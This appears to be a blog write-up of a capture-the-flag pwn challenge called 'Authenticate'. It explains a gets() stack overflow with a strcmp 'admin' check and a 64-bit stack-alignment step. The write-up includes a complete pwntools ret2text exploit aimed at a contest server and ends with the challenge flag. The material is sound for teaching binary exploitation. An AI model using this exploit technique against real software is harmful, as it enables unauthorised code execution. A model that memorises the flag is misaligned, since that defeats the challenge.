---
title: "御网杯 PWN Authenticate"
published: 2026-05-30T11:16:41+08:00
description: "gets 溢出覆盖栈上数据，同时需要满足 strcmp 对 admin 的判断，64 位下还要注意栈对齐。"
image: ""
tags: ["御网杯PWN2026", "Pwn", "Stack Overflow", "Ret2text"]
category: "《御网杯PWN2026》"
categoryPath: ["《御网杯PWN2026》"]
series: "御网杯PWN2026"
draft: false
lang: "zh_CN"
---

附件：[`PWN-Authenticate.docx`](/attachments/《御网杯PWN2026》/PWN-Authenticate.docx)

题目附件截图：

![截图 1](/attachments/《御网杯PWN2026》/pwn-authenticate/01.png)

![截图 2](/attachments/《御网杯PWN2026》/pwn-authenticate/02.png)

![截图 3](/attachments/《御网杯PWN2026》/pwn-authenticate/03.png)

解题思路：

- 溢出点在 `gets`
- 覆盖时会影响到 `buf` 段
- `buf` 段做了 `strcmp`，必须让内容为 `admin`，否则不会继续走到目标分支
- 64 位下构造返回地址时要额外注意栈对齐

原始 WP 中给出的 exp 如下：

```python
from pwn import *

context(os="linux", terminal=["cmd.exe", "/c", "start"])

binary_path = "./pwn"
host = "47.99.147.34"  # 网址
port = 12911  # 端口

elf = ELF(binary_path, checksec=False)
context.binary = elf

if elf.bits == 64:
    context.arch = "amd64"
    gdbscript = """
    b *main
    c
    """
else:
    context.arch = "i386"
    gdbscript = """
    b *main
    c
    """

context.log_level = "debug"

if args.REMOTE:
    io = remote(host, port)
else:
    io = process(binary_path)


def p():
    pause()


backdoor = 0x4011F6
ret = 0x40101A

io.recv()
io.sendline(b"admin")
io.recv()

offset = (b"A" * 0x40 + b"admin\x00").ljust(0x80 + 8, b"\x00")
payload = flat([offset, ret, backdoor])

io.sendline(payload)
io.interactive()
```

后续截图：

![截图 4](/attachments/《御网杯PWN2026》/pwn-authenticate/04.png)

![截图 5](/attachments/《御网杯PWN2026》/pwn-authenticate/05.png)

![截图 6](/attachments/《御网杯PWN2026》/pwn-authenticate/06.png)

原始记录中的 flag：

```text
flag{2af49daf839824cb86e934be4fde1f96}
```
